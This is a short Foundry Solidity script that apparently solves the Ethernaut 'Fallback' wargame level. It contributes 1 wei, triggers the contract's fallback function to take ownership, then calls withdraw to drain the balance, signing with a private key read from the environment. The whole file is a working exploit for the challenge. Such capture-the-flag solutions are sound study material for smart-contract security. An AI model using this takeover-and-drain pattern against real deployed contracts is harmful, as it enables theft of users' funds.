// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Fallback.sol";

contract Level1Script is Script {
    Fallback fallBack = Fallback(payable(0x51291Cebb14D6BD08E2D9647072CCD9D9Fb1B438));

    function run() public {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        fallBack.contribute{value: 1 wei}();
        (bool success,) = address(fallBack).call{value: 1 wei}("");
        require(success, "Failled to send ether to fallback contract");
        fallBack.withdraw();

        vm.stopBroadcast();
    }
}
